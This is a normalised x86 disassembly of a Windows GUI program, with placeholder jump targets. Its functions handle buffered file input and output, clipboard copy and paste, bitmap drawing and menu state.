sub_401000
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ esi ]
cmp ecx 0xffffffff
jne r-xdata
mov eax [ esi + 0xc ]
pop esi
pop ecx
retn
push 0x0
lea edx [ esp + 0x8 ]
push edx
mov edx [ esi + 0x14 ]
push edx
push eax
push ecx
call [ WriteFile@IAT ]
neg eax
sbb eax eax
inc eax
mov [ esp + 0x4 ] eax
mov [ esi + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
push eax
call [ GlobalUnlock@IAT ]
movsx eax [ esi + 0x1c ]
pop esi
pop ecx
retn
movsx eax [ esi + 0x1c ]
pop esi
pop ecx
retn
mov [ esi + 0x1c ] 0x1
sub_401060
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
mov [ esi + 0x1e ] 0x1
mov [ esi + 0x4 ] eax
mov [ esi ] 0xffffffff
call [ GlobalLock@IAT ]
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x4 ]
push eax
mov [ esi + 0x14 ] 0x0
call [ GlobalSize@IAT ]
mov [ esi + 0x10 ] eax
pop esi
retn 0x4
sub_4010b0
mov eax [ esp + 0xc ]
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
mov ecx [ esp + 0xc ]
xor edx edx
push edx
mov [ esi + 0x4 ] edx
mov [ esi + 0x14 ] edx
lea edx [ esp + 0x18 ]
push edx
push edi
push ecx
push eax
mov [ esi + 0x1e ] 0x1
mov [ esi ] eax
mov [ esi + 0x8 ] ecx
call [ ReadFile@IAT ]
mov eax [ esp + 0x14 ]
mov [ esi + 0x18 ] edi
pop edi
mov [ esi + 0x10 ] eax
pop esi
retn 0xc
sub_401100
mov eax [ esp + 0x4 ]
push esi
mov [ ecx + 0x1e ] 0x1
mov [ ecx + 0x4 ] 0x0
mov [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x14 ] 0x0
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
mov [ ecx + 0x10 ] eax
pop esi
retn 0x4
sub_401140
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
inc edi
push edi
push 0x42
mov [ esi + 0x1e ] 0x1
mov [ esi + 0x1c ] 0x0
mov [ esi ] 0xffffffff
call [ GlobalAlloc@IAT ]
push eax
mov [ esi + 0x4 ] eax
call [ GlobalLock@IAT ]
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x4 ]
pop edi
mov [ esi + 0x14 ] 0x0
pop esi
retn 0x4
sub_4011e0
push ebx
mov ebx ecx
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebx + 0x10 ]
push ebp
mov ebp [ esp + 0x10 ]
add ecx ebp
cmp ecx eax
push esi
push edi
jl r-xdata
mov ecx [ ebx + 0xc ]
mov eax [ esp + 0xc ]
add ecx eax
mov [ ebx + 0xc ] ecx
pop ebx
retn 0x8
mov edi [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
mov esi [ esp + 0x14 ]
add edi edx
mov ecx ebp
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x14 ]
pop edi
pop esi
add eax ebp
pop ebp
mov [ ebx + 0x14 ] eax
pop ebx
retn 0x8
mov ecx ebx
call sub_401000
sub_401240
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
movsx ecx [ esi + 0x1e ]
mov edx [ esi + 0x14 ]
mov eax [ esi + 0x10 ]
add ecx edx
cmp ecx eax
jl r-xdata
movsx eax [ esi + 0x1e ]
add [ esi + 0xc ] eax
pop esi
retn 0x4
cmp [ esi + 0x1e ] 0x1
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x14 ]
jle r-xdata
mov ecx esi
call sub_401000
mov cl [ esp + 0x8 ]
mov [ edx + eax ] cl
movsx edx [ esi + 0x1e ]
add [ esi + 0x14 ] edx
pop esi
retn 0x4
mov cx [ esp + 0x8 ]
mov [ edx + eax ] cx
movsx edx [ esi + 0x1e ]
add [ esi + 0x14 ] edx
pop esi
retn 0x4
sub_4012a0
push ecx
push esi
mov esi ecx
cmp [ esi ] 0xffffffff
mov eax [ esi + 0x14 ]
jne r-xdata
mov edx [ esi + 0x10 ]
mov ecx [ esi + 0x8 ]
sub edx eax
push edx
add eax ecx
push eax
push ecx
call sub_429090
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
add esp 0xc
push 0x0
lea ecx [ esp + 0x8 ]
push ecx
mov ecx [ esi + 0x10 ]
sub edx eax
push eax
mov eax [ esi ]
add edx ecx
push edx
push eax
call [ ReadFile@IAT ]
mov eax [ esi + 0x14 ]
mov ecx [ esp + 0x4 ]
mov edx [ esi + 0x10 ]
sub ecx eax
add edx ecx
xor eax eax
mov ecx edx
test ecx ecx
mov [ esi + 0x10 ] edx
mov [ esi + 0x14 ] 0x0
sete al
pop esi
pop ecx
retn
mov edx [ esi + 0x10 ]
xor ecx ecx
cmp eax edx
setge cl
pop esi
mov eax ecx
pop ecx
retn
sub_401320
push esi
mov esi ecx
push edi
movsx edi [ esi + 0x1e ]
call sub_4010a0
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push eax
call [ SetFilePointer@IAT ]
mov eax [ esi ]
mov ecx [ esi + 0x18 ]
mov edx [ esi + 0x8 ]
push eax
push ecx
push edx
mov ecx esi
call sub_4010b0
mov [ esi + 0x1e ] di
pop edi
pop esi
retn
mov [ esi + 0x1e ] di
pop edi
mov [ esi + 0x14 ] 0x0
pop esi
retn
push eax
mov ecx esi
call sub_401060
mov [ esi + 0x1e ] di
pop edi
pop esi
retn
sub_401380
push ebx
mov ebx ecx
mov eax [ ebx + 0x14 ]
mov ecx [ ebx + 0x10 ]
push ebp
mov ebp [ esp + 0x10 ]
add eax ebp
cmp eax ecx
jl r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0x10 ]
lea ecx [ eax + ebp ]
cmp ecx edx
jl r-xdata
mov ecx ebx
call sub_4012a0
test eax eax
jne r-xdata
push edi
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
pop ebp
or eax 0xffffffff
pop ebx
retn 0x8
mov eax [ ebx + 0x14 ]
add eax ebp
pop edi
mov [ ebx + 0x14 ] eax
pop ebp
xor eax eax
pop ebx
retn 0x8
push esi
mov esi [ ebx + 0x8 ]
mov ecx ebp
mov edx ecx
add esi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
sub_4013f0
push esi
mov esi ecx
movsx eax [ esi + 0x1e ]
mov ecx [ esi + 0x14 ]
lea edx [ ecx + eax * 2 ]
cmp edx [ esi + 0x10 ]
jle r-xdata
mov ecx [ esi + 0x14 ]
push edi
mov di [ esi + 0x1e ]
cmp di 0x1
jle r-xdata
mov ecx esi
call sub_4012a0
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
lea edx [ eax + ecx ]
movzx eax [ edx ]
movzx edx [ edx + 0x1 ]
mov edx [ esi + 0x8 ]
movzx eax [ edx + ecx ]
mov edx eax
jmp r-xdata
movsx eax [ esi + 0x1e ]
add [ esi + 0x14 ] eax
or eax 0xffffffff
pop esi
retn
pop esi
retn
test edx edx
jne r-xdata
movsx edi di
add edi ecx
test eax eax
mov [ esi + 0x14 ] edi
pop edi
jne r-xdata
or eax 0xffffffff
sub_401460
push ebx
push ebp
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x10 ]
xor ebp ebp
cmp eax ecx
push edi
jge r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ebx [ esi + 0x14 ]
mov edi [ esi + 0x10 ]
mov eax ebx
cmp eax edi
jge r-xdata
test ebp ebp
jne r-xdata
mov edx [ esi + 0x8 ]
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x8 ]
pop edi
pop esi
pop ebp
add eax ebx
pop ebx
retn
cmp eax edi
jl r-xdata
cmp eax edi
jge r-xdata
cmp cl 0xd
je r-xdata
mov ecx esi
mov ebp 0x1
call sub_4012a0
mov eax [ esi + 0x14 ]
cmp eax [ esi + 0x10 ]
jl r-xdata
mov ecx [ esi + 0x8 ]
cmp [ eax + ecx ] 0xd
jne r-xdata
mov ecx [ esi + 0x10 ]
inc eax
cmp eax ecx
jl r-xdata
cmp eax edi
jge r-xdata
inc eax
mov cl [ edx + eax ]
cmp cl 0xa
je r-xdata
mov edx [ esi + 0x8 ]
cmp [ eax + edx ] 0xa
jne r-xdata
inc eax
sub_4014f0
mov eax [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp esi eax
je r-xdata
pop esi
retn
test esi esi
je r-xdata
mov ecx esi
call sub_40e960
push esi
call j_sub_429931
add esp 0x4
sub_401520
push esi
mov esi [ esp + 0xc ]
cmp esi 0xffffffff
push edi
mov edi ecx
jne r-xdata
mov ecx [ rw-data ]
mov eax [ ecx + 0x50 ]
push eax
call sub_421980
test eax eax
je r-xdata
mov esi [ edi + 0x18 ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x50 ]
push edi
call sub_4217f0
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
pop edi
mov eax 0x1
pop esi
retn 0x8
mov edx [ edi + 0x10 ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x50 ]
sub esi eax
push esi
lea eax [ edx + eax * 2 ]
push eax
call sub_421890
pop edi
pop esi
retn 0x8
mov edx [ rw-data ]
mov ecx [ edx + 0x50 ]
mov [ ecx + 0x21 ] 0x0
sub_4015b0
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x40
je r-xdata
pop esi
retn
mov dl [ esi + 0x44 ]
mov ecx [ rw-data ]
xor eax eax
test dl dl
sete al
push edi
mov edi [ EnableMenuItem@IAT ]
push eax
push 0x2720
push ecx
call edi
mov cl [ esi + 0x44 ]
mov eax [ rw-data ]
xor edx edx
test cl cl
sete dl
push edx
push 0x271f
push eax
call edi
mov al [ esi + 0x44 ]
test al al
setne cl
movzx edx cl
push edx
push 0x2720
mov ecx rw-data
call sub_4245d0
mov al [ esi + 0x44 ]
test al al
setne al
movzx ecx al
push ecx
push 0x271f
mov ecx rw-data
call sub_4245d0
pop edi
sub_401630
sub esp 0x24
push ebx
push ebp
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
mov [ esi + 0x68 ] eax
mov [ esi + 0x54 ] eax
mov eax [ eax + 0x8 ]
xor ebx ebx
push edi
mov [ esp + 0x18 ] esi
mov [ esi + 0x6c ] eax
mov [ esi + 0x58 ] eax
mov [ esi + 0x70 ] bx
mov [ esi + 0x5c ] bx
call sub_40f190
mov ebp [ esi + 0x4c ]
cmp ebp ebx
mov [ esp + 0x10 ] ebx
je r-xdata
mov eax [ rw-data ]
movsx ecx [ eax + 0x8 ]
mov edx [ rw-data ]
neg ecx
push edx
lea edi [ ebx + ecx * 2 ]
call [ GetDC@IAT ]
mov ebx eax
push ebx
mov [ esp + 0x24 ] ebx
call [ CreateCompatibleDC@IAT ]
mov ebp eax
mov al [ rw-data ]
test al al
je r-xdata
lea ecx [ ecx ]
mov ecx [ esp + 0x10 ]
push 0x0
push 0x1
push 0x1
push edi
push ecx
call [ CreateBitmap@IAT ]
mov al [ rw-data ]
test al al
je r-xdata
mov ebp [ ebp ]
test ebp ebp
jne r-xdata
mov cx [ rw-data ]
lea ebx [ ebx ]
mov edx [ esp + 0x1c ]
mov cx [ esp + 0x10 ]
push edx
push ebp
mov [ rw-data ] cx
call [ SelectObject@IAT ]
push ebp
call [ DeleteDC@IAT ]
mov eax [ esp + 0x20 ]
mov ecx [ rw-data ]
push eax
push ecx
call [ ReleaseDC@IAT ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn
mov esi [ edi + 0x8 ]
test esi esi
je r-xdata
mov eax [ esp + 0x10 ]
push edi
push eax
push ebx
call [ CreateCompatibleBitmap@IAT ]
jmp r-xdata
push 0x0
push 0x0
push esi
mov ecx ebp
call sub_421ad0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
movsx edx cx
sub eax edx
cmp eax [ esp + 0x10 ]
jle r-xdata
mov ecx [ edi ]
mov edx [ ebp + 0x10 ]
add ecx esi
movzx ecx [ edx + ecx * 2 ]
push ecx
push eax
mov ecx rw-data
call sub_4138a0
mov ecx [ edi + 0x4 ]
inc esi
cmp esi ecx
jl r-xdata
mov edi [ edi ]
test edi edi
jne r-xdata
lea esp [ esp ]
mov edx [ rw-data ]
mov ebx [ SelectObject@IAT ]
push edx
push ebp
mov [ esp + 0x1c ] eax
call ebx
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x14 ]
push eax
push ebp
call ebx
mov ecx [ esp + 0x10 ]
xor eax eax
push eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] edi
call [ GetStockObject@IAT ]
push eax
lea edx [ esp + 0x28 ]
push edx
push ebp
call [ FillRect@IAT ]
movsx eax [ rw-data ]
movsx ebx [ rw-data ]
mov [ rw-data ] 0x0
mov edi [ esi + 0x4c ]
test edi edi
mov [ esp + 0x10 ] eax
je r-xdata
mov edi [ edi + 0x8 ]
test edi edi
jne r-xdata
mov [ esp + 0x10 ] eax
mov cx [ rw-data ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x24 ]
push rw-data
push ecx
mov ecx [ esp + 0x20 ]
push edx
push ebx
push esi
push edi
push ebp
call sub_40ddc0
movsx eax [ rw-data ]
mov esi [ esi + 0x8 ]
add ebx eax
test esi esi
jne r-xdata
movsx eax [ rw-data ]
mov edx [ edi + 0x4 ]
add ebx eax
xor esi esi
test edx edx
movsx eax cx
jle r-xdata
mov esi [ esp + 0x18 ]
sub_401830
mov eax [ rw-data ]
sub esp 0x4c
push esi
mov esi [ GetClipboardData@IAT ]
push edi
push eax
mov edi ecx
call esi
test eax eax
je r-xdata
mov al [ rw-data ]
cmp al 0xb
je r-xdata
push eax
lea ecx [ esp + 0xc ]
call sub_401060
lea ecx [ esp + 0x8 ]
push ecx
mov ecx edi
call sub_411750
lea ecx [ esp + 0x8 ]
call sub_4010a0
pop edi
xor eax eax
pop esi
add esp 0x4c
retn
push 0xd
call esi
test eax eax
je r-xdata
cmp al 0x1
jne r-xdata
push 0x1
call esi
test eax eax
jne r-xdata
push eax
lea ecx [ esp + 0x2c ]
call sub_401060
movzx edx [ rw-data ]
push edx
lea ecx [ esp + 0x2c ]
call sub_419030
cmp [ rw-data ] 0xb
je r-xdata
push eax
lea ecx [ esp + 0x2c ]
call sub_401060
movzx ecx [ rw-data ]
push ecx
lea ecx [ esp + 0x2c ]
call sub_419030
cmp [ rw-data ] 0x1
jne r-xdata
push 0x7
call esi
test eax eax
jne r-xdata
lea ecx [ esp + 0x28 ]
call sub_401320
push 0xb
lea ecx [ esp + 0x2c ]
call sub_419030
lea eax [ esp + 0x28 ]
push eax
jmp r-xdata
lea ecx [ esp + 0x28 ]
call sub_418e30
test eax eax
je r-xdata
lea edx [ esp + 0x28 ]
push edx
lea ecx [ esp + 0x28 ]
call sub_419090
lea ecx [ esp + 0x28 ]
mov esi eax
call sub_401320
push esi
lea ecx [ esp + 0x2c ]
call sub_419030
pop edi
mov eax 0x1
pop esi
add esp 0x4c
retn
mov ecx edi
call sub_4115c0
lea ecx [ esp + 0x28 ]
call sub_4010a0
pop edi
xor eax eax
pop esi
add esp 0x4c
retn
sub_401980
mov eax [ esp + 0x4 ]
sub esp 0x4c
dec eax
je r-xdata
push r--data
call [ RegisterClipboardFormatA@IAT ]
mov [ rw-data ] eax
sub eax 0x304
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
dec eax
jne r-xdata
add esp 0x4c
retn
push esi
push edi
mov edi [ esp + 0x5c ]
lea eax [ edi - 0x1 ]
cmp eax 0xc
ja r-xdata
mov eax [ rw-data ]
push eax
call [ OpenClipboard@IAT ]
mov ecx [ rw-data ]
push ecx
push 0x305
call sub_401980
push 0x1
push 0x305
call sub_401980
push 0x7
push 0x305
call sub_401980
mov al [ rw-data ]
add esp 0x18
test al al
jne r-xdata
lea ecx [ esp + 0x8 ]
call sub_401190
mov ecx [ rw-data ]
lea edx [ esp + 0x8 ]
push edx
call sub_411b80
push eax
lea ecx [ esp + 0xc ]
call sub_401140
mov ecx [ rw-data ]
mov esi eax
lea eax [ esp + 0x8 ]
push eax
call sub_411b80
push esi
push edi
call [ SetClipboardData@IAT ]
pop edi
pop esi
add esp 0x4c
retn
movzx edx [ eax + lookup_table_401b2c ]
jmp [ edx * 4 + jump_table_401b20 ]
mov al [ rw-data ]
test al al
jne r-xdata
push 0xd
push 0x305
call sub_401980
add esp 0x8
lea ecx [ esp + 0x28 ]
call sub_401190
cmp edi 0xd
mov eax 0xb
je r-xdata
call sub_401630
mov esi eax
push esi
push edi
call [ SetClipboardData@IAT ]
pop edi
pop esi
add esp 0x4c
retn
add esp 0x4c
jmp [ CloseClipboard@IAT ]
push 0x2
push 0x305
call sub_401980
add esp 0x8
push eax
lea ecx [ esp + 0x2c ]
call sub_419030
mov ecx [ rw-data ]
lea eax [ esp + 0x28 ]
push eax
call sub_411560
push eax
lea ecx [ esp + 0x2c ]
call sub_401140
cmp edi 0xd
mov esi eax
mov eax 0xb
je r-xdata
movzx eax [ rw-data ]
push eax
lea ecx [ esp + 0x2c ]
call sub_419030
lea ecx [ esp + 0x28 ]
push ecx
mov ecx [ rw-data ]
call sub_411560
push esi
push edi
call [ SetClipboardData@IAT ]
pop edi
pop esi
add esp 0x4c
retn
movzx eax [ rw-data ]
sub_401b40
push 0xffffffff
push sub_431bc8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
push j_sub_420470
push sub_401590
mov esi ecx
push 0x5
push 0x4
lea eax [ esi + 0xac ]
push eax
mov [ esp + 0x1c ] esi
call sub_429490
push j_sub_420470
push sub_401590
push 0xc
push 0x4
lea ecx [ esi + 0xc0 ]
push ecx
mov [ esp + 0x28 ] 0x0
call sub_429490
mov dx [ esp + 0x1c ]
xor eax eax
mov edi esi
mov ecx 0x3c
[ edi ]
mov ecx [ esp + 0xc ]
mov [ esi + 0xc ] 0x41
mov [ esi + 0x7e ] dx
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_401bd0
push 0xffffffff
push sub_431bf6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
push esi
push edi
push eax
mov esi ecx
call [ OpenClipboard@IAT ]
call [ EmptyClipboard@IAT ]
call sub_401950
test esi esi
jne r-xdata
mov al [ esi + 0x44 ]
test al al
je r-xdata
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0x8 ] eax
test eax eax
mov [ esp + 0x14 ] esi
je r-xdata
mov eax [ rw-data ]
mov esi [ SetClipboardData@IAT ]
push 0x0
push eax
call esi
mov al [ rw-data ]
test al al
jne r-xdata
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0x8 ] eax
test eax eax
mov [ esp + 0x14 ] 0x1
je r-xdata
xor eax eax
mov ecx [ rw-data ]
movsx edx [ ecx + 0x7e ]
push edx
mov ecx eax
call sub_401b40
jmp r-xdata
push 0x0
push 0x1
call esi
push 0x0
push 0x7
call esi
mov al [ rw-data ]
test al al
jne r-xdata
push 0x0
push 0xd
call esi
xor eax eax
movsx edx [ esi + 0x7e ]
push edx
mov ecx eax
call sub_401b40
jmp r-xdata
push 0x0
mov ecx eax
call sub_421980
mov eax [ rw-data ]
mov ecx [ eax + 0x4c ]
mov [ eax + 0x54 ] ecx
mov eax [ rw-data ]
mov edx [ eax + 0x4c ]
mov ecx [ edx + 0x8 ]
mov [ eax + 0x58 ] ecx
jmp r-xdata
test eax eax
mov [ esp + 0x14 ] 0xffffffff
mov [ rw-data ] eax
je r-xdata
call [ CloseClipboard@IAT ]
mov ecx [ esp + 0xc ]
mov eax [ rw-data ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push 0x0
push 0x2
call esi
mov ecx esi
call sub_40ea20
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x1c ]
cmp ecx eax
movsx eax [ esi + 0x24 ]
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
call sub_420ef0
add esp 0x4
jmp r-xdata
test eax eax
mov [ esp + 0x14 ] 0xffffffff
mov [ rw-data ] eax
jne r-xdata
push 0xffffffff
push eax
call sub_401520
test eax eax
jne r-xdata
movsx edx [ esi + 0x38 ]
push edx
push eax
call sub_401520
test eax eax
jne r-xdata
mov ecx [ esi + 0x1c ]
mov edi [ ecx ]
cmp edi [ esi + 0x30 ]
je r-xdata
mov ecx [ rw-data ]
mov edx [ ecx + 0x4c ]
mov [ edx + 0x21 ] al
jmp r-xdata
movsx edx [ esi + 0x38 ]
mov ecx [ esi + 0x30 ]
push edx
push 0x0
call sub_401520
test eax eax
jne r-xdata
push 0xffffffff
push 0x0
mov ecx edi
call sub_401520
test eax eax
jne r-xdata
mov ecx esi
call sub_40db40
mov edi [ edi ]
cmp edi [ esi + 0x30 ]
jne r-xdata
sub_401da0
push 0xffffffff
push sub_431c0b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi [ rw-data ]
test esi esi
jne r-xdata
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0x4 ] eax
test eax eax
mov [ esp + 0x10 ] esi
je r-xdata
xor esi esi
push esi
mov ecx eax
call sub_401b40
mov esi eax
jmp r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
push eax
call [ OpenClipboard@IAT ]
mov ecx esi
call sub_401830
test eax eax
je r-xdata
test esi esi
mov [ esp + 0x10 ] 0xffffffff
je r-xdata
push 0x30
push 0xa
push 0x9
push eax
call sub_420e20
add esp 0x10
call [ CloseClipboard@IAT ]
test esi esi
jne r-xdata
mov ecx esi
call sub_40e960
push esi
call j_sub_429931
add esp 0x4
xor esi esi
sub_401e50
push ebx
push esi
mov esi ecx
call sub_424d30
cmp [ esi + 0x44 ] 0x1
jne r-xdata
mov ecx esi
call sub_40e3d0
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov ecx esi
call sub_40f040
xor eax eax
mov eax [ esi + 0x8 ]
jmp r-xdata
pop esi
pop ebx
retn 0x4
mov ecx [ ebx + 0x50 ]
mov eax [ ebx + 0x4c ]
push edi
cmp eax ecx
push 0x0
mov ecx esi
jne r-xdata
push eax
call sub_401da0
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
push 0x0
push 0xd
call sub_40f360
push 0x0
push 0x0
push 0x25
mov ecx esi
call sub_40f360
push 0x0
push 0x30
mov ecx esi
call sub_424dd0
mov eax [ ebx + 0x4c ]
mov edx [ eax + 0x18 ]
mov ecx [ esi + 0x58 ]
mov eax [ eax + 0x10 ]
push edx
mov edx [ ecx + 0x4 ]
push eax
push edx
push ecx
mov ecx [ esi + 0x54 ]
push esi
call sub_421d20
mov eax [ ebx + 0x4c ]
mov edi [ eax ]
cmp edi [ ebx + 0x50 ]
je r-xdata
push 0x30
call sub_424dd0
mov eax [ ebx + 0x4c ]
jmp r-xdata
mov eax [ esi + 0x54 ]
mov eax [ eax ]
mov [ esi + 0x54 ] eax
mov ecx [ eax + 0x8 ]
mov [ esi + 0x58 ] ecx
mov [ esi + 0x5c ] 0x0
cmp [ ebx + 0xc ] 0x4
jne r-xdata
mov ecx [ esi + 0x54 ]
push ecx
mov ecx esi
call sub_421980
test eax eax
jne r-xdata
mov ecx [ eax + 0x18 ]
mov edx [ eax + 0x10 ]
push ecx
mov ecx esi
push edx
call sub_40ee50
mov ecx esi
call sub_424ac0
push ebx
call sub_4014f0
add esp 0x4
pop edi
mov eax [ ebx + 0x50 ]
mov edx [ ebx + 0x50 ]
mov ecx [ esi + 0x54 ]
push edx
call sub_4217f0
mov ecx esi
call sub_424ac0
pop edi
pop esi
pop ebx
retn 0x4
mov edx [ esi + 0x54 ]
mov ecx [ edx ]
push edi
mov [ esi + 0x54 ] ecx
call sub_421ab0
test eax eax
jne r-xdata
mov ecx [ esi + 0x54 ]
push 0x1
push eax
push esi
call sub_421ad0
mov edi [ edi ]
cmp edi [ ebx + 0x50 ]
jne r-xdata
sub_401f90
mov dl [ eax ]
push ebx
cmp dl [ ecx ]
jne r-xdata
mov al [ eax ]
cmp al 0x7f
pop ebx
ja r-xdata
mov dl [ eax + 0x1 ]
mov bl [ ecx + 0x1 ]
inc eax
inc ecx
cmp dl bl
je r-xdata
movzx ecx [ ecx ]
movzx eax al
sub eax ecx
retn
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jne r-xdata
xor eax eax
retn
cmp al 0x2a
jne r-xdata
sub_401fd0
cmp ecx 0x31
je r-xdata
mov eax 0x1
retn
cmp ecx 0x69
je r-xdata
cmp ecx edx
je r-xdata
add ecx 0xffffff9e
cmp ecx 0x13
ja r-xdata
xor eax eax
retn
movzx ecx [ ecx + lookup_table_402048 ]
jmp [ ecx * 4 + jump_table_402034 ]
cmp edx 0x65
je r-xdata
cmp edx 0x69
jne r-xdata
and eax 0x7f
cmp al 0x43
jne r-xdata
and eax 0x7f
cmp al 0x73
jne r-xdata
cmp edx 0x6f
je r-xdata
mov eax 0x1
retn
mov eax 0x1
retn
and eax 0x7f
cmp eax 0x6f
je r-xdata
cmp eax 0x43
je r-xdata
sub_402060
mov al [ ecx ]
test al al
je r-xdata
mov dl [ ecx ]
xor eax eax
test dl dl
sete al
retn
cmp [ edx ] al
jne r-xdata
mov al [ ecx + 0x1 ]
inc edx
inc ecx
test al al
jne r-xdata
sub_402080
xor eax eax
and ecx 0xff
jmp r-xdata
movzx dx [ eax * 2 + rw-data ]
cmp dx cx
je r-xdata
movzx eax [ eax * 2 + rw-data ]
retn
inc eax
cmp eax 0x9
jl r-xdata
xor eax eax
retn
sub_4020b0
mov ecx [ esp + 0x4 ]
xor eax eax
jmp r-xdata
movzx edx [ eax * 2 + rw-data ]
cmp ecx edx
je r-xdata
movzx eax [ eax * 2 + rw-data ]
or eax 0x2400
retn
inc eax
cmp eax 0x9
jl r-xdata
xor eax eax
retn
sub_4020f0
push esi
mov esi ecx
cmp [ esi + 0x218 ] 0x1fa
jge r-xdata
mov eax [ esp + 0xc ]
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0x214 ]
push 0x10
push 0x8a
push 0x89
push eax
call sub_420e20
add esp 0x14
mov eax 0x1
pop esi
retn 0x8
push 0x1
push 0x1
push r--data
mov ecx rw-data
call sub_425ab0
xor eax eax
pop esi
retn 0x8
sub_4021a0
push esi
push edi
mov edi [ esp + 0xc ]
cmp [ edi ] 0x0
mov esi ecx
je r-xdata
pop edi
pop esi
retn 0x8
push ebx
mov ebx [ esp + 0x14 ]
push ebp
jmp r-xdata
mov [ esi + 0x218 ] 0x0
mov al [ edi ]
cmp al 0x7f
jbe r-xdata
mov al [ edi ]
cmp al 0x69
jne r-xdata
movzx eax al
push ebx
push eax
mov ecx esi
call sub_4020f0
test eax eax
jne r-xdata
cmp al 0x31
jne r-xdata
mov eax [ esi + 0x218 ]
mov [ esi + eax * 2 + 0x224 ] 0x7b
mov edx [ esi + 0x218 ]
inc edx
mov [ esi + 0x218 ] edx
mov eax edx
mov [ esi + eax * 2 + 0x224 ] 0x2424
mov ecx [ esi + 0x218 ]
inc ecx
mov eax ecx
mov [ esi + 0x218 ] ecx
mov [ esi + eax * 2 + 0x224 ] 0x7d
jmp r-xdata
pop ebp
pop ebx
movzx cx [ edi ]
mov edx [ esi + 0x218 ]
and ecx 0x5b7f
or ecx 0x2400
mov [ esi + edx * 2 + 0x224 ] cx
mov ebp [ esi + 0x218 ]
inc ebp
inc edi
mov [ esi + 0x218 ] ebp
mov al [ edi ]
cmp al 0x7f
ja r-xdata
cmp al 0x2a
je r-xdata
mov ecx [ esi + 0x218 ]
mov [ esi + ecx * 2 + 0x224 ] 0x28
mov edx [ esi + 0x218 ]
inc edx
mov [ esi + 0x218 ] edx
mov eax edx
mov [ esi + eax * 2 + 0x224 ] 0x246b
mov ecx [ esi + 0x218 ]
inc ecx
mov eax ecx
mov [ esi + 0x218 ] ecx
mov [ esi + eax * 2 + 0x224 ] 0x29
jmp r-xdata
inc [ esi + 0x218 ]
mov edx [ esi + 0x218 ]
mov ecx 0x2121
mov [ esi + edx * 2 + 0x224 ] cx
mov eax [ esi + 0x218 ]
inc edi
inc eax
mov [ esi + 0x218 ] eax
mov [ esi + eax * 2 + 0x224 ] 0x222a
mov ebp [ esi + 0x218 ]
inc ebp
mov [ esi + 0x218 ] ebp
mov eax ebp
mov [ esi + eax * 2 + 0x224 ] cx
inc [ esi + 0x218 ]
mov al [ edi ]
cmp al 0xa
je r-xdata
movzx edx al
push edx
call sub_4020b0
add esp 0x4
test eax eax
je r-xdata
lea ebp [ esi + 0x4 ]
mov ecx ebp
inc edi
call sub_40bad0
mov ecx [ esi + 0x218 ]
push ecx
lea edx [ esi + 0x224 ]
push edx
mov ecx ebp
call sub_40b820
push 0xffffffff
mov ecx ebp
